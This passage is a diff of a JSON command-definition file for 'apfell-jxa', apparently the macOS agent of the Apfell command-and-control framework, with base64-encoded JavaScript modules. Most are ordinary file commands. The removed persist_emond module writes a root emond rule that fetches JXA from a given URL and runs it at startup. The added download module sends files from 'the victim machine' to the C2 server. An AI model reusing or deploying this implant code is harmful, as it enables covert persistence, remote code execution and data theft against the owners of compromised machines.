FsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVQb3NpeFBlcm1pc3Npb25zJ107CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ25hbWUnXSA9IHBhdGg7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3NpemUnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZVNpemUnXTsKICAgICAgICAgICAgYXR0cmlidXRlc1sncGVybWlzc2lvbnMnXSA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOzsKICAgICAgICAgICAgYXR0cmlidXRlc1snb3duZXInXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ10gKyAiKSI7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ2dyb3VwJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZXNbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddKSB7CiAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzWydoaWRkZW4nXSA9ICJZIjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ2hpZGRlbiddID0gIiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZVNpemUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudE5hbWUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ107CiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXTsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBKU09OLnN0cmluZ2lmeShhdHRyaWJ1dGVzLCBudWxsLCA2KSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH1lbHNlewogICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgInVzZXJfb3V0cHV0IjogIkZhaWxlZCB0byBnZXQgYXR0cmlidXRlcyBvZiBmaWxlLiBGaWxlIGRvZXNuJ3QgZXhpc3Qgb3IgeW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byByZWFkIGl0IiwKICAgICAgICAgICAgICAgICJjb21wbGV0ZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgInN0YXR1cyI6ICJlcnJvciIKICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gewogICAgICAgICAgICAidXNlcl9vdXRwdXQiOiAiRXJyb3I6ICIgKyBlcnJvci50b1N0cmluZygpLAogICAgICAgICAgICAiY29tcGxldGVkIjogdHJ1ZSwKICAgICAgICAgICAgInN0YXR1cyI6ICJlcnJvciIKICAgICAgICB9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
-            }
-          ],
-          "transforms": [
-            {
-              "order": 1,
-              "parameter": "path",
-              "active": true,
-              "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
-              "command": "ls",
-              "command_id": 31,
-              "payload_type": "apfell-jxa",
-              "transform": "jsonSingleParameter",
-              "parameter_type": "String"
-            }
-          ],
-          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKCWlmKHRhc2suc3RhdHVzID09PSAnZXJyb3InKXsKCQlyZXR1cm4gIjxwcmU+IEVycm9yOiB1bnRvZ2dsZSBmb3IgZXJyb3IgbWVzc2FnZShzKSA8L3ByZT4iOwoJfQogIGxldCByb3dzID0gW107CiAgdHJ5ewogIAlmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2VzLmxlbmd0aDsgaSsrKXsKICAgICAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VzW2ldWydyZXNwb25zZSddKTsKICAgICAgICBsZXQgcm93X3N0eWxlID0gIiI7CgkJbGV0IGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifTsKCSAgICByb3dzLnB1c2goeyJuYW1lIjogZGF0YVsnbmFtZSddLAogICAgICAgICAgICAgICAgICAgInNpemUiOiBkYXRhWydzaXplJ10sCiAgICAgICAgICAgICAgICAgICAicGVybWlzc2lvbnMiOiBkYXRhWydwZXJtaXNzaW9ucyddLAogICAgICAgICAgICAgICAgICAgIm93bmVyIjogZGF0YVsnb3duZXInXSwKICAgICAgICAgICAgICAgICAgICJncm91cCI6IGRhdGFbJ2dyb3VwJ10sCiAgICAgICAgICAgICAgICAgICAidHlwZSI6IGRhdGFbJ3R5cGUnXSwKICAgICAgICAgICAgICAgICAgICJ4YXR0ciI6ICIiLAogICAgICAgICAgICAgICAgICAgInJvdy1zdHlsZSI6IHJvd19zdHlsZSwKICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjogY2VsbF9zdHlsZQogICAgICAgIH0pOwoJICAgIGlmKCFkYXRhLmhhc093blByb3BlcnR5KCdmaWxlcycpKXtkYXRhWydmaWxlcyddID0gW119OwoJICAgIGRhdGFbJ2ZpbGVzJ10uZm9yRWFjaChmdW5jdGlvbihyKXsKICAgIAkJbGV0IHJvd19zdHlsZSA9ICIiOwogICAgCQkvL2lmKHJbJ25hbWUnXS5pbmNsdWRlcygiLnNoIikpe3Jvd19zdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpyZWQ7Y29sb3I6d2hpdGUifQogICAgCQlpZihyLmhhc093blByb3BlcnR5KCdFeHRlbmRlZEF0dHJpYnV0ZXMnKSl7CiAgICAJCQlyWyd4YXR0ciddID0gT2JqZWN0LmtleXMoclsnRXh0ZW5kZWRBdHRyaWJ1dGVzJ10pLmpvaW4oIjxicj4iKTsKICAgIAkJfWVsc2V7CiAgICAJCQlyWyd4YXR0ciddID0gIiI7CiAgICAJCX0KCQkgICAgcm93cy5wdXNoKHsibmFtZSI6IHJbJ25hbWUnXSwKCSAgICAgICAgICAgICAgICAgICAic2l6ZSI6IHJbJ3NpemUnXSwKCSAgICAgICAgICAgICAgICAgICAicGVybWlzc2lvbnMiOiByWydwZXJtaXNzaW9ucyddLAoJICAgICAgICAgICAgICAgICAgICJvd25lciI6IHJbJ293bmVyJ10sCgkgICAgICAgICAgICAgICAgICAgImdyb3VwIjogclsnZ3JvdXAnXSwKCSAgICAgICAgICAgICAgICAgICAidHlwZSI6IHJbJ3R5cGUnXSwKCSAgICAgICAgICAgICAgICAgICAieGF0dHIiOiByWyd4YXR0ciddLAoJICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCgkgICAgICAgICAgICAgICAgICAgImNlbGwtc3R5bGUiOiB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifQogICAgICAgICAgIH0pOwoJCX0pOwoJfQogICAgCXZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJuYW1lIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoic2l6ZSIsICJzaXplIjoiMmVtIn0sIHsibmFtZSI6InBlcm1pc3Npb25zIiwgInNpemUiOiIyZW0ifSx7Im5hbWUiOiJvd25lciIsInNpemUiOiIzZW0ifSAseyJuYW1lIjogImdyb3VwIiwgInNpemUiOiAiMmVtIn0gLHsibmFtZSI6InR5cGUiLCAic2l6ZSI6ICIxZW0ifSwgeyJuYW1lIjoieGF0dHIiLCAic2l6ZSI6ICIxZW0ifV0sIHJvd3MpOwogICAgCXJldHVybiBvdXRwdXQ7CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiAiPHByZT4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzWzBdWydyZXNwb25zZSddLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQp9"
-        },
-        {
-          "needs_admin": false,
-          "help_cmd": "cd [path]",
-          "version": 2,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "Change the current working directory to another directory. No quotes are necessary and relative paths are fine",
-          "cmd": "cd",
-          "parameters": [
-            {
-              "type": "String",
-              "hint": "path to change directory to",
-              "choices": "",
-              "required": true,
-              "name": "path"
-            }
-          ],
-          "attack": [
-            {
-              "t_num": "T1083",
-              "attack_name": "File and Directory Discovery"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "cd.js": "ZXhwb3J0cy5jZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGlmKCFjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgncGF0aCcpKXtyZXR1cm4geyJ1c2VyX291dHB1dCI6ICJNaXNzaW5nIHBhdGggcGFyYW1ldGVyIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifX0KICAgICAgICBsZXQgZmlsZU1hbmFnZXIgPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CiAgICAgICAgbGV0IHN1Y2Nlc3MgPSBmaWxlTWFuYWdlci5jaGFuZ2VDdXJyZW50RGlyZWN0b3J5UGF0aChjb21tYW5kX3BhcmFtc1sncGF0aCddKTsKICAgICAgICBpZihzdWNjZXNzKXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiTmV3IGN3ZDogIiArIGZpbGVNYW5hZ2VyLmN1cnJlbnREaXJlY3RvcnlQYXRoLmpzLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIkZhaWxlZCB0byBjaGFuZ2UgZGlyZWN0b3J5IiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
-            }
-          ],
-          "transforms": [
-            {
-              "order": 1,
-              "parameter": "path",
-              "active": true,
-              "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
-              "command": "cd",
-              "command_id": 32,
-              "payload_type": "apfell-jxa",
-              "transform": "jsonSingleParameter",
-              "parameter_type": "String"
-            }
-          ]
-        },
-        {
-          "needs_admin": false,
           "help_cmd": "cat \/path\/to\/file",
           "version": 2,
           "is_exit": false,
@@ -920,9 +823,9 @@
               "parameter": "path",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "cat",
-              "command_id": 33,
+              "command_id": 38,
               "payload_type": "apfell-jxa",
               "transform": "jsonSingleParameter",
               "parameter_type": "String"
@@ -981,83 +884,14 @@
               "parameter": "",
               "active": true,
               "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
+              "timestamp": "05\/07\/2020 07:01:49",
               "command": "test_password",
-              "command_id": 34,
+              "command_id": 39,
               "payload_type": "apfell-jxa",
               "transform": "apfelljxa_test_password_shorthand",
               "parameter_type": "None"
             }
           ]
-        },
-        {
-          "needs_admin": true,
-          "help_cmd": "persist_emond",
-          "version": 1,
-          "is_exit": false,
-          "is_file_browse": false,
-          "file_browse_parameters": "",
-          "is_process_list": false,
-          "process_list_parameters": "",
-          "is_download_file": false,
-          "download_file_parameters": "",
-          "is_remove_file": false,
-          "remove_file_parameters": "",
-          "is_agent_generator": false,
-          "author": "",
-          "deleted": false,
-          "description": "Create persistence with an emond plist file in \/etc\/emond.d\/rules\/ and a .DS_Store file to trigger it",
-          "cmd": "persist_emond",
-          "parameters": [
-            {
-              "type": "String",
-              "hint": "Name of plist in \/etc\/emond.d\/rules\/",
-              "choices": "",
-              "required": true,
-              "name": "file_name"
-            },
-            {
-              "type": "String",
-              "hint": "Command if type is custom_bash-c",
-              "choices": "",
-              "required": false,
-              "name": "command"
-            },
-            {
-              "type": "String",
-              "hint": "url of payload for oneliner-jxa",
-              "choices": "",
-              "required": false,
-              "name": "url"
-            },
-            {
-              "type": "Choice",
-              "hint": "",
-              "choices": "oneliner-jxa\ncustom_bash-c",
-              "required": true,
-              "name": "payload_type"
-            },
-            {
-              "type": "String",
-              "hint": "Rule name for inside of the plist",
-              "choices": "",
-              "required": true,
-              "name": "rule_name"
-            }
-          ],
-          "attack": [
-            {
-              "t_num": "T1150",
-              "attack_name": "Plist Modification"
-            }
-          ],
-          "artifacts": [],
-          "files": [
-            {
-              "persist_emond.js": "ZXhwb3J0cy5wZXJzaXN0X2Vtb25kID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIHRyeXsKICAgICAgICAvL2Vtb25kIHBlcnNpc3RlbmNlIGZyb20gaHR0cHM6Ly93d3cueG9ycmlvci5jb20vZW1vbmQtcGVyc2lzdGVuY2UvCiAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICAvLyByZWFkICIvU3lzdGVtL0xpYnJhcnkvTGF1bmNoRGFlbW9ucy9jb20uYXBwbGUuZW1vbmQucGxpc3QiIGZvciB0aGUgIlF1ZXVlRGlyZWN0b3JpZXMiIGtleSAocmV0dXJucyBhcnJheSkKICAgICAgICAvLyBjcmVhdGUgIi5EU19TdG9yZSIgZmlsZSB0aGVyZSB0aGF0J3MgZW1wdHkKICAgICAgICAvLyBjcmVhdGUgbmV3IHBsaXN0IGluICIvZXRjL2Vtb25kLmQvcnVsZXMvIgogICAgICAgIGxldCBydWxlX25hbWUgPSAidXBkYXRlX2ZpbGVzIjsKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ3J1bGVfbmFtZScpICYmIGNvbmZpZ1sncnVsZV9uYW1lJ10gIT09ICIiKXtydWxlX25hbWUgPSBjb25maWdbJ3J1bGVfbmFtZSddO30KICAgICAgICBsZXQgcGF5bG9hZF90eXBlID0gIm9uZWxpbmVyLWp4YSI7CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdwYXlsb2FkX3R5cGUnKSAmJiBjb25maWdbJ3BheWxvYWRfdHlwZSddICE9PSAiIil7cGF5bG9hZF90eXBlID0gY29uZmlnWydwYXlsb2FkX3R5cGUnXTt9CiAgICAgICAgaWYocGF5bG9hZF90eXBlID09PSAib25lbGluZXItanhhIil7CiAgICAgICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgndXJsJykgJiYgY29uZmlnWyd1cmwnXSAhPT0gIiIpe3ZhciB1cmwgPSBjb25maWdbJ3VybCddO30KICAgICAgICAgICAgZWxzZXsgcmV0dXJuICJVUkwgaXMgcmVxdWlyZWQgZm9yIHRoZSBvbmVsaW5lci1qeGEgcGF5bG9hZF90eXBlIjsgfQogICAgICAgICAgICB2YXIgY29tbWFuZCA9ICJldmFsKE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoJC5OU0RhdGEuZGF0YVdpdGhDb250ZW50c09mVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZygnIiArCiAgICAgICAgICAgIHVybCArICInKSksJC5OU1VURjhTdHJpbmdFbmNvZGluZykpKSI7CiAgICAgICAgICAgIC8vIG5vdyB3ZSBuZWVkIHRvIGJhc2U2NCBlbmNvZGUgb3VyIGNvbW1hbmQKICAgICAgICAgICAgdmFyIGNvbW1hbmRfZGF0YSA9ICQoY29tbWFuZCkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU0RhdGEuTlNVVEYxNlN0cmluZ0VuY29kaW5nKTsKICAgICAgICAgICAgdmFyIGJhc2U2NF9jb21tYW5kID0gY29tbWFuZF9kYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgdmFyIGZ1bGxfY29tbWFuZCA9ICJlY2hvIFwiIiArIGJhc2U2NF9jb21tYW5kICsgIlwiIHwgYmFzZTY0IC1EIHwgL3Vzci9iaW4vb3Nhc2NyaXB0IC1sIEphdmFTY3JpcHQgJmFtcDsiOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmKHBheWxvYWRfdHlwZSA9PT0gImN1c3RvbV9iYXNoLWMiKXsKICAgICAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdjb21tYW5kJykgJiYgY29uZmlnWydjb21tYW5kJ10gIT09ICIiKXt2YXIgZnVsbF9jb21tYW5kID0gY29uZmlnWydjb21tYW5kJ107fQogICAgICAgICAgICBlbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ImNvbW1hbmQgaXMgYSByZXF1aXJlZCBmaWVsZCBmb3IgdGhlIGN1c3RvbV9iYXNoLWMgcGF5bG9hZF90eXBlIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBnZXQgb3VyIG5ldyBwbGlzdCBmaWxlX25hbWUKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ2ZpbGVfbmFtZScpICYmIGNvbmZpZ1snZmlsZV9uYW1lJ10gIT09ICIiKXsgdmFyIGZpbGVfbmFtZSA9IGNvbmZpZ1snZmlsZV9uYW1lJ107fQogICAgICAgIGVsc2V7IHJldHVybiB7InVzZXJfb3V0cHV0IjoiZmlsZSBuYW1lIGlzIHJlcXVpcmVkIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsgfQoKICAgICAgICB2YXIgcGxpc3RfY29udGVudHMgPSAiPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIj8+XG4iICsKICAgICI8IURPQ1RZUEUgcGxpc3QgUFVCTElDIFwiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOXCIgXCJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkXCI+XG4iICsKICAgICI8cGxpc3QgdmVyc2lvbj1cIjEuMFwiPlxuIiArCiAgICAiPGFycmF5PlxuIiArCiAgICAiCTxkaWN0PlxuIiArCiAgICAiCQk8a2V5Pm5hbWU8L2tleT5cbiIgKwogICAgIgkJPHN0cmluZz4iICsgcnVsZV9uYW1lICsgIjwvc3RyaW5nPlxuIiArCiAgICAiCQk8a2V5PmVuYWJsZWQ8L2tleT5cbiIgKwogICAgIgkJPHRydWUvPlxuIiArCiAgICAiCQk8a2V5PmV2ZW50VHlwZXM8L2tleT5cbiIgKwogICAgIgkJPGFycmF5PlxuIiArCiAgICAiCQkJPHN0cmluZz5zdGFydHVwPC9zdHJpbmc+XG4iICsKICAgICIJCTwvYXJyYXk+XG4iICsKICAgICIJCTxrZXk+YWN0aW9uczwva2V5PlxuIiArCiAgICAiCQk8YXJyYXk+XG4iICsKICAgICIJCQk8ZGljdD5cbiIgKwogICAgIgkJCQk8a2V5PmNvbW1hbmQ8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPi9iaW4vc2xlZXA8L3N0cmluZz5cbiIgKwogICAgIgkJCQk8a2V5PnVzZXI8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPnJvb3Q8L3N0cmluZz5cbiIgKwogICAgIgkJCQk8a2V5PmFyZ3VtZW50czwva2V5PlxuIiArCiAgICAiCQkJCTxhcnJheT5cbiIgKwogICAgIgkJCQkJPHN0cmluZz42MDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTwvYXJyYXk+XG4iICsKICAgICIJCQkJPGtleT50eXBlPC9rZXk+XG4iICsKICAgICIJCQkJPHN0cmluZz5SdW5Db21tYW5kPC9zdHJpbmc+XG4iICsKICAgICIJCQk8L2RpY3Q+XG4iICsKICAgICIJCQk8ZGljdD5cbiIgKwogICAgIgkJCQk8a2V5PmNvbW1hbmQ8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPi9iaW4vYmFzaDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTxrZXk+dXNlcjwva2V5PlxuIiArCiAgICAiCQkJCTxzdHJpbmc+cm9vdDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTxrZXk+YXJndW1lbnRzPC9rZXk+XG4iICsKICAgICIJCQkJPGFycmF5PlxuIiArCiAgICAiCQkJCQk8c3RyaW5nPi1jPC9zdHJpbmc+XG4iICsKICAgICIJCQkJCTxzdHJpbmc+ICIgKyBmdWxsX2NvbW1hbmQgKyAiPC9zdHJpbmc+XG4iICsKICAgICIJCQkJPC9hcnJheT5cbiIgKwogICAgIgkJCQk8a2V5PnR5cGU8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPlJ1bkNvbW1hbmQ8L3N0cmluZz5cbiIgKwogICAgIgkJCTwvZGljdD5cbiIgKwogICAgIgkJPC9hcnJheT5cbiIgKwogICAgIgk8L2RpY3Q+XG4iICsKICAgICI8L2FycmF5PlxuIiArCiAgICAiPC9wbGlzdD4iOwogICAgICAgIC8vIHJlYWQgdGhlIHBsaXN0IGZpbGUgYW5kIGNoZWNrIHRoZSBRdWV1ZURpcmVjdG9yaWVzIGZpZWxkCiAgICAgICAgdmFyIHByZWZzID0gT2JqQy5kZWVwVW53cmFwKCQuTlNNdXRhYmxlRGljdGlvbmFyeS5hbGxvYy5pbml0V2l0aENvbnRlbnRzT2ZGaWxlKCQoIi9TeXN0ZW0vTGlicmFyeS9MYXVuY2hEYWVtb25zL2NvbS5hcHBsZS5lbW9uZC5wbGlzdCIpKSk7CiAgICAgICAgLy9jb25zb2xlLmxvZyhKU09OLnN0cmluZ2lmeShwcmVmcykpOwogICAgICAgIHZhciBxdWV1ZURpcmVjdG9yaWVzID0gcHJlZnNbJ1F1ZXVlRGlyZWN0b3JpZXMnXTsKICAgICAgICBpZihxdWV1ZURpcmVjdG9yaWVzICE9PSB1bmRlZmluZWQgJiYgcXVldWVEaXJlY3Rvcmllcy5sZW5ndGggPiAwKXsKICAgICAgICAgICAgdmFyIHF1ZXVlRGlyZWN0b3J5UGF0aCA9IHF1ZXVlRGlyZWN0b3JpZXNbMF07CiAgICAgICAgICAgIHdyaXRlX2RhdGFfdG9fZmlsZSgiICIsIHF1ZXVlRGlyZWN0b3J5UGF0aCArICIvLkRTX1N0b3JlIik7CiAgICAgICAgICAgIC8vIG5vdyB0aGF0IHdlIGhhdmUgYSBmaWxlIGluIG91ciBxdWV1ZURpcmVjdG9yeSwgd2UgbmVlZCB0byB3cml0ZSBvdXQgb3VyIHBsaXN0CiAgICAgICAgICAgIHdyaXRlX2RhdGFfdG9fZmlsZShwbGlzdF9jb250ZW50cywgIi9ldGMvZW1vbmQuZC9ydWxlcy8iICsgZmlsZV9uYW1lKTsKCiAgICAgICAgICAgIHZhciB1c2VyX291dHB1dCA9ICJDcmVhdGVkICIgKyBxdWV1ZURpcmVjdG9yeVBhdGggKyAiLy5EU19TdG9yZSBhbmQgL2V0Yy9lbW9uZC5kL3J1bGVzLyIgKyBmaWxlX25hbWUgKyAiIHdpdGggY29udGVudHM6IFxuIiArIHBsaXN0X2NvbnRlbnRzOwoKICAgICAgICAgICAgLy8gYW5ub3VuY2Ugb3VyIGNyZWF0ZWQgYXJ0aWZhY3RzIGFuZCB1c2VyIG91dHB1dAogICAgICAgICAgICBsZXQgYXJ0aWZhY3RzID0geyd1c2VyX291dHB1dCc6IHVzZXJfb3V0cHV0LCAnYXJ0aWZhY3RzJzogW3snYmFzZV9hcnRpZmFjdCc6ICdGaWxlIENyZWF0ZScsICdhcnRpZmFjdCc6IHF1ZXVlRGlyZWN0b3J5UGF0aCArICIvLkRTX1N0b3JlIn0sIHsnYmFzZV9hcnRpZmFjdCc6ICdGaWxlIENyZWF0ZScsICdhcnRpZmFjdCc6ICcvZXRjL2Vtb25kLmQvcnVsZXMvJyArIGZpbGVfbmFtZX1dLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIHJldHVybiBhcnRpZmFjdHMKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJRdWV1ZURpcmVjdG9yaWVzIGFycmF5IGlzIGVpdGhlciBub3QgdGhlcmUgb3IgMCBpbiBsZW5ndGgiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
-            }
-          ],
-          "transforms": []
         },
         {
           "needs_admin": false,
@@ -1102,6 +936,516 @@
         },
         {
           "needs_admin": false,
+          "help_cmd": "download {path to remote file}",
+          "version": 6,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
+          "cmd": "download",
+          "parameters": [],
+          "attack": [
+            {
+              "t_num": "T1020",
+              "attack_name": "Automated Exfiltration"
+            },
+            {
+              "t_num": "T1030",
+              "attack_name": "Data Transfer Size Limits"
+            },
+            {
+              "t_num": "T1041",
+              "attack_name": "Exfiltration Over Command and Control Channel"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "download.js": "ZXhwb3J0cy5kb3dubG9hZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAJaWYocGFyYW1zID09PSAiIiB8fCBwYXJhbXMgPT09IHVuZGVmaW5lZCl7cmV0dXJuIHsndXNlcl9vdXRwdXQnOiAiTXVzdCBzdXBwbHkgYSBwYXRoIHRvIGEgZmlsZSB0byBkb3dubG9hZCIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07IH0KICAgICAgICByZXR1cm4gQzIuZG93bmxvYWQodGFzaywgcGFyYW1zKTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsndXNlcl9vdXRwdXQnOiBlcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQoKfTsKQ09NTUFORF9FTkRTX0hFUkU="
+            }
+          ],
+          "transforms": [],
+          "browser_script": 